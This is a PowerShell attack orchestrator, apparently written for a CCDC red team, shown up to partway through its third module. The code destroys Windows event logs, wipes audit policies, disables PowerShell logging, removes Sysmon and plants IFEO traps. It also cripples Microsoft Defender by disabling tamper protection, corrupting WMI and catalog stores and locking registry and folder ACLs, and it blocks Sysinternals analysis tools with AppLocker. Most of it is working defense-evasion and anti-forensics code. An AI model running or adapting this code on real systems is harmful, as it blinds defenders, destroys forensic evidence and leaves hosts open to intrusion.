# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# CCDC Windows Phase 3 — COMBINED Orchestrator
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
#
# Embeds all 7 Phase 3 component scripts as Invoke-* functions.
# Self-contained — no external script files required at deploy time.
#
# MODULES (execution order is fixed):
#   1  BlindSpot            T1562.002/.006/T1070.001/T1059.001  All
#   2  BreakingBad          T1562.001/T1490/T1222               All
#   3  NoEscape             T1562.001/T1553.006/T1546.003       All
#   4  KerberosKhaos        T1484.001/.002/T1222/T1531          DC only
#   5  ConditionalSurrender T1565.001/T1584.002/T1562.004       DNS role
#   6  DeadInTheWater       T1489/T1565.001/T1562.004/T1222     MSSQL only
#   7  GhostInTheWMI        T1546.003/.015/T1547.010            All
#
# USAGE:
#   .\CCDC_Windows_P3_COMBINED.ps1
#   .\CCDC_Windows_P3_COMBINED.ps1 -All
#   .\CCDC_Windows_P3_COMBINED.ps1 -Targets DefenderOnly
#   .\CCDC_Windows_P3_COMBINED.ps1 -Targets ServiceOnly
#   .\CCDC_Windows_P3_COMBINED.ps1 -Targets PersistenceOnly
#   .\CCDC_Windows_P3_COMBINED.ps1 -Modules 1,3,7
#   .\CCDC_Windows_P3_COMBINED.ps1 -Modules BlindSpot,GhostInTheWMI
#   .\CCDC_Windows_P3_COMBINED.ps1 -Status
#   .\CCDC_Windows_P3_COMBINED.ps1 -AttackerIP 10.0.0.5 -AttackerPort 4444
#   .\CCDC_Windows_P3_COMBINED.ps1 -Resume         # skip already-SUCCESS modules
#   .\CCDC_Windows_P3_COMBINED.ps1 -Force          # re-run even if SUCCESS
#
# ROLE DETECTION (automatic at runtime):
#   AD/DC:    NTDS service present     → enables KerberosKhaos
#   DNS:      DNS service present      → enables ConditionalSurrender
#   MSSQL:    MSSQLSERVER service present → enables DeadInTheWater
#
# IMPORTANT — EXECUTION ORDER:
#   BlindSpot MUST run first (kills logging before other ops are recorded).
#   GhostInTheWMI MUST run last (WMI infrastructure intact for persistence).
#   KerberosKhaos MUST run before ConditionalSurrender (gpupdate needs DNS).
#
# Plan: Phase_3_Tools/Scripts_Planning/Phase3_Windows_Plan.md
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

#Requires -RunAsAdministrator
#Requires -Version 5.1

[CmdletBinding()]
param(
    [ValidateSet('All','DefenderOnly','ServiceOnly','PersistenceOnly')]
    [string]   $Targets      = 'All',
    [string[]] $Modules      = @(),
    [switch]   $All,
    [switch]   $Status,
    [switch]   $Resume,
    [switch]   $Force,
    [string]   $AttackerIP   = "10.0.0.1",
    [int]      $AttackerPort = 4444
)

$ErrorActionPreference = "Continue"

#region OPERATOR CONFIG
$script:AttackerIP   = $AttackerIP
$script:AttackerPort = $AttackerPort
#endregion

# ─────────────────────────────────────────────────────────────────────────────
# STATE FILE SYSTEM  (mirrors P2 pattern — hidden CSV in drivers\color\)
# ─────────────────────────────────────────────────────────────────────────────
$script:StateDir  = "C:\Windows\System32\spool\drivers\color"
$script:StateFile = "$($script:StateDir)\.p3_state.csv"

function Read-StateFile {
    $tbl = @{}
    if (Test-Path $script:StateFile) {
        try {
            Import-Csv $script:StateFile -ErrorAction Stop | ForEach-Object {
                $tbl[$_.Module] = $_
            }
        } catch {}
    }
    return $tbl
}

function Write-StateFile {
    param([hashtable]$State)
    try {
        if (-not (Test-Path $script:StateDir)) {
            New-Item -ItemType Directory -Path $script:StateDir -Force | Out-Null
        }
        $State.Values | Sort-Object Module |
            Export-Csv $script:StateFile -NoTypeInformation -Force -ErrorAction Stop
        $f = Get-Item $script:StateFile -ErrorAction SilentlyContinue
        if ($f) { $f.Attributes = 'Hidden,System' }
    } catch {}
}

function Set-ModuleState {
    param([string]$Module, [string]$Status, [string]$Notes = '')
    $state = Read-StateFile
    $state[$Module] = [PSCustomObject]@{
        Module    = $Module
        Status    = $Status
        Timestamp = (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
        Notes     = $Notes
    }
    Write-StateFile $state
}

# ─────────────────────────────────────────────────────────────────────────────
# COLOR HELPERS (defined once — component functions must NOT redefine these)
# ─────────────────────────────────────────────────────────────────────────────
function Write-Info    { param($m) Write-Host "[*] $m" -ForegroundColor Cyan    }
function Write-Success { param($m) Write-Host "[+] $m" -ForegroundColor Green   }
function Write-Warn    { param($m) Write-Host "[!] $m" -ForegroundColor Yellow  }
function Write-Err     { param($m) Write-Host "[-] $m" -ForegroundColor Red     }
function Write-Section { param($m) Write-Host "`n====[ $m ]====" -ForegroundColor Magenta }

# ─────────────────────────────────────────────────────────────────────────────
# BANNER
# ─────────────────────────────────────────────────────────────────────────────
function Show-Banner {
    Write-Host ""
    Write-Host " ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\" -ForegroundColor Red
    Write-Host "  CCDC WINDOWS — PHASE 3 COMBINED" -ForegroundColor Red
    Write-Host "  BlindSpot · BreakingBad · NoEscape · KerberosKhaos" -ForegroundColor DarkRed
    Write-Host "  ConditionalSurrender · DeadInTheWater · GhostInTheWMI" -ForegroundColor DarkRed
    Write-Host " \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\///////////////////////////////  " -ForegroundColor Red
    Write-Host ""
}

# ─────────────────────────────────────────────────────────────────────────────
# MODULE 1 — EVASION: BLIND SPOT
# ─────────────────────────────────────────────────────────────────────────────
function Invoke-BlindSpot {
    Write-Section "1/7 — BlindSpot: Log/Audit/Sysmon/WER Destruction"

    # Layer 1 — Event Log Size Destruction
    Write-Section "Layer 1 — Event Log Size Destruction"

    $LogChannels = @(
        "Security",
        "System",
        "Application",
        "Microsoft-Windows-PowerShell/Operational",
        "Windows PowerShell",
        "Microsoft-Windows-Sysmon/Operational"
    )

    foreach ($chan in $LogChannels) {
        try {
            & "$env:SystemRoot\System32\wevtutil.exe" sl "$chan" /ms:1048576 /rt:false /ab:false 2>$null
            if ($LASTEXITCODE -eq 0) {
                Write-Success "Log shrunken: $chan -> 1 MB (rolls over fast)"
            } else {
                Write-Warn "wevtutil sl failed for $chan (exit $LASTEXITCODE) — channel may not exist"
            }
        } catch {
            Write-Warn "Could not resize $chan : $_"
        }
    }

    # Layer 2 — Audit Policy Wipe
    Write-Section "Layer 2 — Audit Policy Wipe"

    & "$env:SystemRoot\System32\auditpol.exe" /clear /y | Out-Null
    if ($LASTEXITCODE -eq 0) {
        Write-Success "auditpol /clear — all audit policies cleared"
    } else {
        Write-Err "auditpol /clear failed (exit $LASTEXITCODE)"
    }

    & "$env:SystemRoot\System32\auditpol.exe" /set /subcategory:"*" /success:disable /failure:disable | Out-Null
    if ($LASTEXITCODE -eq 0) {
        Write-Success "auditpol — all subcategories disabled (success + failure)"
    } else {
        Write-Err "auditpol /set failed (exit $LASTEXITCODE)"
    }

    # Layer 3 — PowerShell Logging Destruction
    Write-Section "Layer 3 — PowerShell Logging Destruction"

    $PSPolicyBase = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell"

    $PSLoggingKeys = @(
        @{ Path = "$PSPolicyBase\ScriptBlockLogging"; Name = "EnableScriptBlockLogging" },
        @{ Path = "$PSPolicyBase\ModuleLogging";      Name = "EnableModuleLogging"      },
        @{ Path = "$PSPolicyBase\Transcription";      Name = "EnableTranscripting"      }
    )

    foreach ($entry in $PSLoggingKeys) {
        try {
            if (-not (Test-Path $entry.Path)) {
                New-Item -Path $entry.Path -Force | Out-Null
            }
            Set-ItemProperty -Path $entry.Path -Name $entry.Name -Value 0 -Type DWORD -Force
            Write-Success "Disabled: $($entry.Name)"
        } catch {
            Write-Warn "Could not set $($entry.Name): $_"
        }
    }

    try {
        $modPath = "$PSPolicyBase\ModuleLogging"
        if (-not (Test-Path $modPath)) { New-Item -Path $modPath -Force | Out-Null }
        Set-ItemProperty -Path $modPath -Name "ModuleNames" -Value @() -Type MultiString -Force
        Write-Success "ModuleNames allow-list cleared"
    } catch {
        Write-Warn "Could not clear ModuleNames: $_"
    }

    # Layer 4 — Sysmon Removal + IFEO Intercept
    Write-Section "Layer 4 — Sysmon Removal"

    $SysmonServiceNames = @("Sysmon", "Sysmon64", "SysmonDrv")
    $SysmonFound        = $false

    foreach ($svcName in $SysmonServiceNames) {
        $svc = Get-Service -Name $svcName -ErrorAction SilentlyContinue
        if ($svc) {
            $SysmonFound = $true
            try {
                Stop-Service -Name $svcName -Force -ErrorAction SilentlyContinue
                & "$env:SystemRoot\System32\sc.exe" delete $svcName | Out-Null
                Write-Success "Stopped and deleted service: $svcName"
            } catch {
                Write-Warn "Could not remove service $svcName : $_"
            }
        }
    }

    $SysmonBins = Get-ChildItem -Path "$env:SystemRoot\" -Filter "sysmon*.exe" -ErrorAction SilentlyContinue
    foreach ($bin in $SysmonBins) {
        try {
            Remove-Item -Path $bin.FullName -Force
            Write-Success "Deleted binary: $($bin.FullName)"
        } catch {
            Write-Warn "Could not delete $($bin.FullName): $_"
        }
    }

    if (-not $SysmonFound) {
        Write-Info "Sysmon not detected on this host — placing IFEO traps preemptively"
    }

    $IFEOStubPath = "$env:SystemRoot\Temp\svchost_compat.exe"
    try {
        if (-not (Test-Path $IFEOStubPath)) {
            [System.IO.File]::WriteAllBytes($IFEOStubPath, [byte[]]@())
            Write-Info "IFEO stub created at $IFEOStubPath"
        }
    } catch {
        Write-Warn "Could not create IFEO stub: $_"
    }

    $IFEOBase    = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
    $IFEOTargets = @("sysmon.exe", "sysmon64.exe")

    foreach ($target in $IFEOTargets) {
        try {
            $keyPath = "$IFEOBase\$target"
            if (-not (Test-Path $keyPath)) {
                New-Item -Path $keyPath -Force | Out-Null
            }
            Set-ItemProperty -Path $keyPath -Name "Debugger" -Value $IFEOStubPath -Type String -Force
            Write-Success "IFEO trap set for $target -> $IFEOStubPath"
        } catch {
            Write-Warn "Could not set IFEO for $target : $_"
        }
    }

    # Layer 5 — EVTX Journal Corruption
    Write-Section "Layer 5 — EVTX Journal Corruption"

    try {
        Stop-Service -Name EventLog -Force -ErrorAction Stop
        Write-Info "EventLog service stopping..."

        $deadline = (Get-Date).AddSeconds(10)
        while ((Get-Service -Name EventLog).Status -ne 'Stopped' -and (Get-Date) -lt $deadline) {
            Start-Sleep -Milliseconds 500
        }

        $evtxDir    = "$env:SystemRoot\System32\winevt\Logs"
        $evtxFiles  = @("Security.evtx", "System.evtx", "Application.evtx")
        $nullHeader = [byte[]](0x00, 0x00, 0x00, 0x00)

        foreach ($fname in $evtxFiles) {
            $fpath = Join-Path $evtxDir $fname
            if (Test-Path $fpath) {
                try {
                    [System.IO.File]::WriteAllBytes($fpath, $nullHeader)
                    Write-Success "Corrupted EVTX header: $fname"
                } catch {
                    Write-Warn "Could not corrupt $fname : $_"
                }
            } else {
                Write-Warn "$fname not found at expected path"
            }
        }

        Start-Service -Name EventLog -ErrorAction SilentlyContinue
        Write-Success "EventLog restarted — empty fresh logs created"
    } catch {
        Write-Warn "EVTX corruption block failed: $_ — EventLog may still be stopped"
        Start-Service -Name EventLog -ErrorAction SilentlyContinue
    }

    # Layer 6 — Windows Error Reporting Disable
    Write-Section "Layer 6 — Windows Error Reporting Disable"

    $WerPolicyPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Windows Error Reporting"
    $WerSvcPath    = "HKLM:\SOFTWARE\Microsoft\Windows\Windows Error Reporting"

    try {
        if (-not (Test-Path $WerPolicyPath)) {
            New-Item -Path $WerPolicyPath -Force | Out-Null
        }
        Set-ItemProperty -Path $WerPolicyPath -Name "Disabled" -Value 1 -Type DWORD -Force
        Write-Success "WER policy key set: Disabled=1"
    } catch {
        Write-Warn "Could not set WER policy key: $_"
    }

    try {
        Set-ItemProperty -Path $WerSvcPath -Name "Disabled" -Value 1 -Type DWORD -Force
        Write-Success "WER service key set: Disabled=1"
    } catch {
        Write-Warn "Could not set WER service key: $_"
    }

    try {
        Stop-Service -Name WerSvc -Force -ErrorAction SilentlyContinue
        Set-Service  -Name WerSvc -StartupType Disabled -ErrorAction SilentlyContinue
        Write-Success "WerSvc stopped and disabled"
    } catch {
        Write-Warn "Could not stop/disable WerSvc: $_"
    }

    Write-Host ""
    Write-Success "Blind Spot complete — logging visibility destroyed"
}

# ─────────────────────────────────────────────────────────────────────────────
# MODULE 2 — DEFENDER: BREAKING BAD
# ─────────────────────────────────────────────────────────────────────────────
function Invoke-BreakingBad {
    Write-Section "2/7 — BreakingBad: Structural Defender Destruction"

    $osInfo   = Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue
    $prodType = if ($osInfo) { $osInfo.ProductType } else { 1 }
    $isServer = $prodType -ne 1
    Write-Info "ProductType=$prodType — $( if ($isServer) { 'Server SKU' } else { 'Workstation SKU' } )"

    # PREAMBLE — Disable TamperProtection
    Write-Section "PREAMBLE — Disable TamperProtection"

    $tpTaskName = "CCDC_DisableTamperProt"
    Unregister-ScheduledTask -TaskName $tpTaskName -Confirm:$false -ErrorAction SilentlyContinue
    $tpAction    = New-ScheduledTaskAction -Execute "powershell.exe" `
        -Argument '-NonInteractive -WindowStyle Hidden -Command "Set-MpPreference -DisableTamperProtection $true -Force"'
    $tpPrincipal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    $tpSettings  = New-ScheduledTaskSettingsSet -ExecutionTimeLimit (New-TimeSpan -Minutes 1)
    try {
        Register-ScheduledTask -TaskName $tpTaskName -Action $tpAction -Principal $tpPrincipal `
            -Settings $tpSettings -Force -ErrorAction Stop | Out-Null
        Start-ScheduledTask -TaskName $tpTaskName -ErrorAction Stop
        $tpWait = 0
        do { Start-Sleep -Seconds 1; $tpWait++ } while (
            (Get-ScheduledTask -TaskName $tpTaskName -ErrorAction SilentlyContinue).State -eq 'Running' -and $tpWait -lt 15
        )
        Unregister-ScheduledTask -TaskName $tpTaskName -Confirm:$false -ErrorAction SilentlyContinue
        Write-Success "TamperProtection disable task completed"
    } catch {
        Write-Warn "Could not execute TamperProtection disable task: $_"
        Write-Warn "Subsequent layers may fail if TamperProtection is still active — re-run as SYSTEM"
    }

    # PREAMBLE — Stop Defender Services
    Write-Section "PREAMBLE — Stop Defender Services"

    foreach ($svc in @("WinDefend","WdNisSvc","WdNisDrv","WdFilter","SecurityHealthService")) {
        $s = Get-Service -Name $svc -ErrorAction SilentlyContinue
        if ($s) {
            try {
                Stop-Service -Name $svc -Force -ErrorAction Stop
                Write-Success "Stopped: $svc"
            } catch {
                Write-Warn "Could not stop ${svc}: $_"
            }
        }
    }

    # LAYER 1: WMI Repository Corruption
    Write-Section "LAYER 1 — WMI Repository Corruption"

    $avEntries = Get-CimInstance -Namespace "root/SecurityCenter2" -ClassName "AntiVirusProduct" `
        -ErrorAction SilentlyContinue
    if ($avEntries) {
        foreach ($entry in @($avEntries)) {
            try {
                $name = $entry.displayName
                Remove-CimInstance -InputObject $entry -ErrorAction Stop
                Write-Success "Removed WMI AV entry: $name"
            } catch {
                Write-Warn "Failed to remove AV entry: $_"
            }
        }
    } else {
        Write-Warn "No AntiVirusProduct instances found in root/SecurityCenter2"
    }

    $wbemAuto = "$env:SystemRoot\System32\wbem\AutoRecover"
    if (Test-Path $wbemAuto) {
        $mofFiles = Get-ChildItem $wbemAuto -Filter "*.mof" -ErrorAction SilentlyContinue |
            Where-Object { $_.Name -match "(?i)(defender|securitycenter|wscenter|wsc[._]|mpwbem|mpclient|mpas)" }
        if ($mofFiles) {
            foreach ($mof in $mofFiles) {
                try {
                    [System.IO.File]::WriteAllBytes($mof.FullName, [byte[]]@(0x00))
                    Write-Success "Zero'd MOF auto-recovery: $($mof.Name)"
                } catch {
                    Write-Warn "Could not overwrite $($mof.Name): $_"
                }
            }
        } else {
            Write-Warn "No matching MOF auto-recovery files found"
        }
        Get-ChildItem $wbemAuto -ErrorAction SilentlyContinue |
            Where-Object { $_.Name -match "defender|mpwbem|mpclient|wscsvc|wscapi" } |
            ForEach-Object {
                try { Remove-Item $_.FullName -Force; Write-Success "Removed: $($_.Name)" }
                catch { Write-Warn "Could not remove $($_.Name): $_" }
            }
    } else {
        Write-Warn "WMI AutoRecover path not found: $wbemAuto"
    }

    # LAYER 2: Signature Store ACL Lock
    Write-Section "LAYER 2 — Signature Store ACL Lock"

    $defPath = "$env:ProgramData\Microsoft\Windows Defender\Definition Updates"
    if (Test-Path $defPath) {
        $dirs = Get-ChildItem $defPath -Directory -ErrorAction SilentlyContinue
        if ($dirs) {
            $dirs | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
            Write-Success "Deleted $($dirs.Count) definition update subdirectorie(s)"
        } else {
            Write-Info "Definition Updates directory already empty"
        }

        try {
            $acl  = Get-Acl $defPath
            $deny = New-Object System.Security.AccessControl.FileSystemAccessRule(
                "NT SERVICE\WinDefend",
                [System.Security.AccessControl.FileSystemRights]::FullControl,
                [System.Security.AccessControl.InheritanceFlags]"ContainerInherit,ObjectInherit",
                [System.Security.AccessControl.PropagationFlags]::None,
                [System.Security.AccessControl.AccessControlType]::Deny)
            $acl.AddAccessRule($deny)
            Set-Acl -Path $defPath -AclObject $acl
            Write-Success "DENY FullControl → NT SERVICE\WinDefend on: $defPath"
        } catch {
            Write-Err "Failed to set DENY ACL on Definition Updates: $_"
        }
    } else {
        Write-Warn "Definition Updates path not found: $defPath"
    }

    $nisPath = "$env:ProgramData\Microsoft\Windows Defender\NIS\Definitions"
    if (Test-Path $nisPath) {
        Remove-Item $nisPath -Recurse -Force -ErrorAction SilentlyContinue
        Write-Success "Wiped NIS Definitions: $nisPath"
    }

    # LAYER 3: Catalog Trust Break
    Write-Section "LAYER 3 — Catalog Trust Break"

    $cryptSvc = Get-Service -Name "CryptSvc" -ErrorAction SilentlyContinue
    if ($cryptSvc) {
        try {
            Stop-Service -Name "CryptSvc" -Force -ErrorAction Stop
            Write-Success "Stopped CryptSvc"
            $svcWait = 0
            while ((Get-Service -Name "CryptSvc" -ErrorAction SilentlyContinue).Status -ne "Stopped" -and $svcWait -lt 10) {
                Start-Sleep -Seconds 1; $svcWait++
            }
        } catch {
            Write-Warn "Could not stop CryptSvc: $_"
        }
    }

    $catroot2 = "$env:SystemRoot\System32\catroot2"
    if (Test-Path $catroot2) {
        $logFiles = Get-ChildItem $catroot2 -Recurse -Filter "*.log" -ErrorAction SilentlyContinue
        if ($logFiles) {
            $logFiles | Remove-Item -Force -ErrorAction SilentlyContinue
            Write-Success "Deleted $($logFiles.Count) catroot2 transaction log(s)"
        }
        $catdbFiles = Get-ChildItem $catroot2 -Recurse -Filter "catdb" -ErrorAction SilentlyContinue
        foreach ($db in @($catdbFiles)) {
            try {
                [System.IO.File]::WriteAllBytes($db.FullName, [byte[]](0x00,0x00,0x00,0x00))
                Write-Success "Corrupted catdb: $($db.FullName)"
            } catch {
                Write-Warn "Could not corrupt $($db.FullName): $_"
            }
        }
    } else {
        Write-Warn "catroot2 path not found: $catroot2"
    }

    $catStore = "$env:SystemRoot\System32\catroot\{F750E6C3-38EE-11D1-85E5-00C04FC295EE}"
    if (Test-Path $catStore) {
        $defCats = Get-ChildItem $catStore -ErrorAction SilentlyContinue |
            Where-Object { $_.Name -match "defender|MpSig|Mpam|mpas|msfull|mpasbase" }
        if ($defCats) {
            $defCats | Remove-Item -Force -ErrorAction SilentlyContinue
            Write-Success "Removed $($defCats.Count) Defender catalog file(s) from catroot"
        } else {
            Write-Info "No Defender catalog files matched in catroot"
        }
    }

    try {
        Start-Service -Name "CryptSvc" -ErrorAction SilentlyContinue
        Write-Info "CryptSvc restarted (catroot2 will rebuild empty)"
    } catch {
        Write-Warn "Could not restart CryptSvc: $_"
    }

    # LAYER 4: Feature Uninstall (Server only)
    Write-Section "LAYER 4 — Feature Uninstall (Server Only)"

    if ($isServer) {
        Import-Module ServerManager -ErrorAction SilentlyContinue
        $feat = Get-WindowsFeature -Name "Windows-Defender" -ErrorAction SilentlyContinue
        if ($feat -and $feat.Installed) {
            try {
                Uninstall-WindowsFeature -Name "Windows-Defender" -ErrorAction Stop | Out-Null
                Write-Success "Windows-Defender feature uninstalled — requires WinSxS source media to restore"
            } catch {
                Write-Err "Feature uninstall failed: $_"
                Write-Info "Trying DISM fallback..."
                & dism.exe /Online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /Quiet 2>$null
                if ($LASTEXITCODE -eq 0) {
                    Write-Success "DISM feature removal succeeded"
                } else {
                    Write-Warn "DISM also failed (exit $LASTEXITCODE)"
                }
            }
        } elseif ($feat -and -not $feat.Installed) {
            Write-Warn "Windows-Defender feature exists but is already uninstalled"
        } else {
            Write-Warn "Windows-Defender feature not found via Get-WindowsFeature"
        }
    } else {
        Write-Info "Workstation SKU — skipping feature uninstall"
    }

    # LAYER 5: Task Folder Lock
    Write-Section "LAYER 5 — Task Folder Lock"

    $defTasks = Get-ScheduledTask -TaskPath "\Microsoft\Windows\Windows Defender\" `
        -ErrorAction SilentlyContinue
    if ($defTasks) {
        $defTasks | Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue
        Write-Success "Unregistered $($defTasks.Count) Defender scheduled task(s)"
    } else {
        Write-Info "No Defender scheduled tasks found"
    }

    $taskDir = "$env:SystemRoot\System32\Tasks\Microsoft\Windows\Windows Defender"
    if (-not (Test-Path $taskDir)) {
        New-Item -ItemType Directory -Path $taskDir -Force -ErrorAction SilentlyContinue | Out-Null
        Write-Info "Created empty task folder for ACL lock: $taskDir"
    }
    & icacls.exe $taskDir /deny "BUILTIN\Administrators:(CI)(OI)(W,D,WD,WO)" /T /C /Q 2>$null
    $rc1 = $LASTEXITCODE
    & icacls.exe $taskDir /deny "NT AUTHORITY\SYSTEM:(CI)(OI)(W,D,WD,WO)" /T /C /Q 2>$null
    $rc2 = $LASTEXITCODE
    if ($rc1 -eq 0 -and $rc2 -eq 0) {
        Write-Success "DENY write ACE applied to task folder: $taskDir"
    } else {
        Write-Warn "icacls partial failure on task folder (rc1=$rc1 rc2=$rc2)"
    }

    $taskReg = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\Microsoft\Windows\Windows Defender"
    if (Test-Path $taskReg) {
        try {
            $tacl  = Get-Acl $taskReg
            $tdeny = New-Object System.Security.AccessControl.RegistryAccessRule(
                "BUILTIN\Administrators",
                [System.Security.AccessControl.RegistryRights]::WriteKey,
                [System.Security.AccessControl.InheritanceFlags]::ContainerInherit,
                [System.Security.AccessControl.PropagationFlags]::None,
                [System.Security.AccessControl.AccessControlType]::Deny)
            $tacl.AddAccessRule($tdeny)
            Set-Acl -Path $taskReg -AclObject $tacl
            Write-Success "DENY WriteKey applied to task cache registry key"
        } catch {
            Write-Warn "Could not lock task cache registry key: $_"
        }
    }

    # LAYER 6: Registry Trap
    Write-Section "LAYER 6 — Registry Trap"

    $policyKey = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
    if (-not (Test-Path $policyKey)) {
        New-Item -Path $policyKey -Force | Out-Null
        Write-Info "Created policy key: $policyKey"
    }
    Set-ItemProperty -Path $policyKey -Name "DisableAntiSpyware"        -Value 1 -Type DWord
    Set-ItemProperty -Path $policyKey -Name "DisableRealtimeMonitoring" -Value 1 -Type DWord
    Set-ItemProperty -Path $policyKey -Name "DisableBehaviorMonitoring" -Value 1 -Type DWord
    Set-ItemProperty -Path $policyKey -Name "DisableAntiVirus"          -Value 1 -Type DWord
    Write-Success "Wrote disable policy values to: $policyKey"

    $tamperKey = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features"
    if (Test-Path $tamperKey) {
        try {
            Set-ItemProperty -Path $tamperKey -Name "TamperProtection" -Value 0 -Type DWord
            Write-Success "TamperProtection = 0 in Defender\Features"
        } catch {
            Write-Warn "Could not set TamperProtection: $_"
        }
    }

    try {
        $racl  = Get-Acl $policyKey
        $rdeny = New-Object System.Security.AccessControl.RegistryAccessRule(
            "BUILTIN\Administrators",
            [System.Security.AccessControl.RegistryRights]::WriteKey,
            [System.Security.AccessControl.InheritanceFlags]::ContainerInherit,
            [System.Security.AccessControl.PropagationFlags]::None,
            [System.Security.AccessControl.AccessControlType]::Deny)
        $racl.AddAccessRule($rdeny)
        Set-Acl -Path $policyKey -AclObject $racl
        Write-Success "DENY WriteKey applied to policy key — admin must take ownership to modify"
    } catch {
        Write-Err "Failed to lock policy key ACL: $_"
    }

    Write-Host ""
    Write-Success "BreakingBad complete"
}

# ─────────────────────────────────────────────────────────────────────────────
# MODULE 3 — SYSINTERNALS: NO ESCAPE
# ─────────────────────────────────────────────────────────────────────────────
function Invoke-NoEscape {
    Write-Section "3/7 — NoEscape: SysInternals Analyst Tool Denial"

    $TargetTools = @(
        'procexp.exe','procexp64.exe','procmon.exe','procmon64.exe',
        'tcpview.exe','autoruns.exe','autoruns64.exe','autorunsc.exe',
        'handle.exe','handle64.exe','strings.exe','strings64.exe',
        'listdlls.exe','listdlls64.exe','accesschk.exe','accesschk64.exe',
        'procdump.exe','procdump64.exe','pslist.exe',
        'bginfo.exe','sysmon.exe','sysmon64.exe'
    )

    # Helper: Lock a HKLM registry key against user writes
    function Lock-RegistryKey {
        param([string]$SubKey, [string]$Description)
        try {
            $key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey(
                $SubKey,
                [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,
                [System.Security.AccessControl.RegistryRights]::ChangePermissions)
            if (-not $key) { Write-Warn "Key not found (skip): $SubKey"; return }
            $acl = $key.GetAccessControl()
            $deny = New-Object System.Security.AccessControl.RegistryAccessRule(
                'BUILTIN\Users',
                [System.Security.AccessControl.RegistryRights]'SetValue,CreateSubKey,Delete',
                'ContainerInherit','None','Deny')
            $acl.AddAccessRule($deny)
            $key.SetAccessControl($acl)
            $key.Close()
            Write-Success "ACL-locked: $Description"
        } catch { Write-Warn "Could not lock $Description : $_" }
    }

    # LAYER 1 — AppLocker Publisher Deny Rule
    Write-Section "Layer 1: AppLocker Publisher Deny Rule"

    try {
        Set-Service -Name AppIDSvc -StartupType Automatic -ErrorAction SilentlyContinue
        Start-Service -Name AppIDSvc -ErrorAction SilentlyContinue
        Write-Info "AppIDSvc started / confirmed running"

        $existingXml = (Get-AppLockerPolicy -Effective -Xml)
        [xml]$policyDoc = $existingXml

        $exeCollection = $policyDoc.AppLockerPolicy.RuleCollection |
            Where-Object { $_.Type -eq 'Exe' }
        if (-not $exeCollection) {
            $exeCollection = $policyDoc.CreateElement('RuleCollection')
            $exeCollection.SetAttribute('Type','Exe')
            $exeCollection.SetAttribute('EnforcementMode','Enabled')
            $policyDoc.AppLockerPolicy.AppendChild($exeCollection) | Out-Null
        } else {
            $exeCollection.SetAttribute('EnforcementMode','Enabled')
        }

        $hasAdminAllow = $exeCollection.FilePathRule |
            Where-Object { $_.Action -eq 'Allow' -and $_.UserOrGroupSid -eq 'S-1-5-32-544' }
        if (-not $hasAdminAllow) {
            $allowXml = @"
<FilePathRule Id="921cc481-6e17-4653-8f75-050b80acca20"
  Name="Allow Admins - all files" Description="Default admin allow"
  UserOrGroupSid="S-1-5-32-544" Action="Allow">
  <Conditions><FilePathCondition Path="*"/></Conditions>
</FilePathRule>
"@
            $fragment = $policyDoc.CreateDocumentFragment()
            $fragment.InnerXml = $allowXml
            $exeCollection.AppendChild($fragment) | Out-Null
        }

        foreach ($tool in $TargetTools) {
            $id = [System.Guid]::NewGuid().ToString()
            $ruleXml = @"
<FilePublisherRule Id="$id"
  Name="CCDC_Deny_SysInt_$tool"
  Description="Phase 3 - SysInternals publisher block"
  UserOrGroupSid="S-1-1-0" Action="Deny">
  <Conditions>
    <FilePublisherCondition
      PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US"
      ProductName="*" BinaryName="$tool">
      <BinaryVersionRange LowSection="*" HighSection="*"/>
    </FilePublisherCondition>
  </Conditions>
</FilePublisherRule>
"@
            $fragment = $policyDoc.CreateDocumentFragment()
            $fragment.InnerXml = $ruleXml
            $exeCollection.AppendChild($fragment) | Out-Null
        }

        $catchId = [System.Guid]::NewGuid().ToString()
        $catchXml = @"
<FilePublisherRule Id="$catchId"
  Name="CCDC_Deny_SysInt_PublisherCatchAll"
  Description="Phase 3 - Sysinternals publisher catch-all (renamed copies)"
  UserOrGroupSid="S-1-1-0" Action="Deny">
  <Conditions>
    <FilePublisherCondition
      PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US"
      ProductName="Sysinternals*" BinaryName="*">
      <BinaryVersionRange LowSection="*" HighSection="*"/>
    </FilePublisherCondition>
  </Conditions>
</FilePublisherRule>
"@
        $fragment = $policyDoc.CreateDocumentFragment()
        $fragment.InnerXml = $catchXml
        $exeCollection.AppendChild($fragment) | Out-Null

        foreach ($collType in @('Script','Msi')) {
            $coll = $policyDoc.AppLockerPolicy.RuleCollection |
                Where-Object { $_.Type -eq $collType }
            if (-not $coll) {
                $newColl = $policyDoc.CreateElement('RuleCollection')
                $newColl.SetAttribute('Type',$collType)
                $newColl.SetAttribute('EnforcementMode','NotConfigured')
                $policyDoc.AppLockerPolicy.AppendChild($newColl) | Out-Null
            }
        }

        $tmpXml = "$env:TEMP\applocker_noescape.xml"
        $policyDoc.Save($tmpXml)
        Set-AppLockerPolicy -XmlPolicy $tmpXml -ErrorAction Stop
        Remove-Item $tmpXml -Force -ErrorAction SilentlyContinue
        Write-Success "AppLocker publisher deny rules applied ($($TargetTools.Count) named + catch-all)"
    } catch {
        Write-Err "Layer 1 failed: $_"
    }

